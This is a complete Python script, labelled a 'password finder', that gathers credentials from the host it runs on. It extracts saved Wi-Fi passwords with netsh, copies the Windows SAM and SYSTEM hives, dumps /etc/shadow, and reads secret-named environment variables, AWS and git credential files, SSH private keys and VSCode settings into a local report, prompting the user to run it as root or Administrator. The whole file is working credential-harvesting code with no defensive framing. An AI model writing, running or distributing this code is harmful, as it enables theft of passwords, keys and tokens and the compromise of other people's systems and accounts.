import os
import platform
import subprocess
import re
import shutil

OUTPUT_FILE = "password_finder_output.txt"

def dump_wifi_passwords_windows():
    """
    Extract saved Wi-Fi profiles and their passwords using netsh command on Windows.
    """
    wifi_data = []
    try:
        profiles_output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True, encoding='utf-8')
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", profiles_output)

        for profile in profiles:
            profile = profile.strip()
            try:
                key_output = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True, text=True, encoding='utf-8')
                key_match = re.search(r"Key Content\s*:\s*(.*)", key_output)
                password = key_match.group(1) if key_match else "N/A"
                wifi_data.append((profile, password))
            except subprocess.CalledProcessError:
                wifi_data.append((profile, "Error retrieving password"))
    except Exception as e:
        wifi_data.append(("Error retrieving Wi-Fi profiles", str(e)))

    return wifi_data

def dump_windows_sam():
    """
    Attempt to copy SAM and SYSTEM files from Windows directory.
    These files are usually locked, so this may fail without special handling.
    """
    results = []
    system32_config = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "config")
    sam_path = os.path.join(system32_config, "SAM")
    system_path = os.path.join(system32_config, "SYSTEM")

    output_sam = "SAM_dump"
    output_system = "SYSTEM_dump"

    try:
        shutil.copy2(sam_path, output_sam)
        results.append(f"SAM file copied to {output_sam}")
    except Exception as e:
        results.append(f"Failed to copy SAM file: {e}")

    try:
        shutil.copy2(system_path, output_system)
        results.append(f"SYSTEM file copied to {output_system}")
    except Exception as e:
        results.append(f"Failed to copy SYSTEM file: {e}")

    return results

def dump_linux_shadow():
    """
    Read and dump /etc/shadow file content on Linux.
    """
    shadow_path = "/etc/shadow"
    output_file = "shadow_dump.txt"
    try:
        with open(shadow_path, "r") as f:
            content = f.read()
        with open(output_file, "w") as out:
            out.write(content)
        return f"/etc/shadow content dumped to {output_file}"
    except Exception as e:
        return f"Failed to read /etc/shadow: {e}"

def dump_environment_variables():
    """
    Dump environment variables that might contain sensitive info.
    """
    env_vars = {}
    for key, value in os.environ.items():
        if any(s in key.lower() for s in ['pass', 'key', 'token', 'secret']):
            env_vars[key] = value
    return env_vars

def dump_common_password_files():
    """
    Attempt to read common files that might contain passwords or hashes.
    This is a simple example and can be extended.
    """
    files_to_check = []

    current_os = platform.system()
    if current_os == "Windows":
        files_to_check = [
            os.path.expandvars(r"%USERPROFILE%\.aws\credentials"),
            os.path.expandvars(r"%USERPROFILE%\.git-credentials"),
            os.path.expandvars(r"%USERPROFILE%\AppData\Roaming\Microsoft\Credentials"),
            os.path.expandvars(r"%USERPROFILE%\AppData\Roaming\Code\User\settings.json"),  # VSCode settings (may contain tokens)
        ]
    elif current_os == "Linux":
        files_to_check = [
            os.path.expanduser("~/.aws/credentials"),
            os.path.expanduser("~/.git-credentials"),
            os.path.expanduser("~/.ssh/id_rsa"),  # Private SSH key (if unencrypted)
            os.path.expanduser("~/.ssh/id_dsa"),
            os.path.expanduser("~/.ssh/id_ecdsa"),
            os.path.expanduser("~/.ssh/id_ed25519"),
            os.path.expanduser("~/.config/Code/User/settings.json"),  # VSCode settings
        ]

    file_contents = {}
    for file_path in files_to_check:
        if os.path.exists(file_path):
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                file_contents[file_path] = content
            except Exception as e:
                file_contents[file_path] = f"Error reading file: {e}"
    return file_contents

def main():
    current_os = platform.system()
    with open(OUTPUT_FILE, "w", encoding="utf-8") as f:
        f.write(f"=== Password Finder Report for {current_os} ===\n\n")

        # Environment variables
        f.write("=== Environment Variables Possibly Containing Secrets ===\n")
        env_vars = dump_environment_variables()
        if env_vars:
            for k, v in env_vars.items():
                f.write(f"{k} = {v}\n")
        else:
            f.write("No sensitive environment variables found.\n")
        f.write("\n")

        # Common credential files
        f.write("=== Common Credential Files Content ===\n")
        files_content = dump_common_password_files()
        if files_content:
            for path, content in files_content.items():
                f.write(f"\n--- {path} ---\n")
                f.write(content + "\n")
        else:
            f.write("No common credential files found or accessible.\n")
        f.write("\n")

        if current_os == "Windows":
            # Wi-Fi passwords
            f.write("=== Wi-Fi Profiles and Passwords ===\n")
            wifi_passwords = dump_wifi_passwords_windows()
            for profile, password in wifi_passwords:
                f.write(f"Profile: {profile}\nPassword: {password}\n\n")

            # SAM and SYSTEM files
            f.write("=== SAM and SYSTEM Files Dump ===\n")
            sam_results = dump_windows_sam()
            for line in sam_results:
                f.write(line + "\n")

        elif current_os == "Linux":
            # /etc/shadow dump
            f.write("=== /etc/shadow File Dump ===\n")
            shadow_result = dump_linux_shadow()
            f.write(shadow_result + "\n")

        else:
            f.write("Unsupported OS for this script.\n")

    print(f"Password finder scan completed. Output saved to {OUTPUT_FILE}")

if __name__ == "__main__":
    # On Linux, warn if not root
    if platform.system() == "Linux" and os.geteuid() != 0:
        print("Warning: You should run this script as root to access /etc/shadow and some credential files.")
    # On Windows, recommend running as Administrator
    if platform.system() == "Windows":
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if not is_admin:
                print("Warning: You should run this script as Administrator to access all data.")
        except Exception:
            pass

    main()
